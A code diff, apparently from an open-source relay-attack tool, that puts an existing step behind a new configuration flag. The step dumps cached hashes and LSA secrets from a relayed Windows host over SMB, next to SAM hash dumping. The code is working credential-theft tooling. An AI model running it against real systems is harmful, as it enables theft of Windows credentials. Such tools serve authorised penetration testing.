@@ -210,16 +210,17 @@ class SMBAttack(ProtocolAttack):
                         samHashes.export(sam_filename)
                         LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
 
-                        try:
-                            securityFileName = remoteOps.saveSECURITY()
-                            lsaSecrets = LSASecrets(securityFileName, bootKey, remoteOps, isRemote = True)
-                            lsaSecrets.dumpCachedHashes()
-                            lsaSecrets.exportCached(cached_filename)
-                            lsaSecrets.dumpSecrets()
-                            lsaSecrets.exportSecrets(lsa_filename)
-                            LOG.info("Done dumping LSA secrets for host: %s", self.__SMBConnection.getRemoteHost())
-                        except Exception as e:
-                            LOG.error("Failed to dump LSA secrets: %s", str(e))
+                        if self.config.dumpLSA:
+                            try:
+                                securityFileName = remoteOps.saveSECURITY()
+                                lsaSecrets = LSASecrets(securityFileName, bootKey, remoteOps, isRemote = True)
+                                lsaSecrets.dumpCachedHashes()
+                                lsaSecrets.exportCached(cached_filename)
+                                lsaSecrets.dumpSecrets()
+                                lsaSecrets.exportSecrets(lsa_filename)
+                                LOG.info("Done dumping LSA secrets for host: %s", self.__SMBConnection.getRemoteHost())
+                            except Exception as e:
+                                LOG.error("Failed to dump LSA secrets: %s", str(e))
                 except Exception as e:
                     LOG.error(str(e))
                 finally:
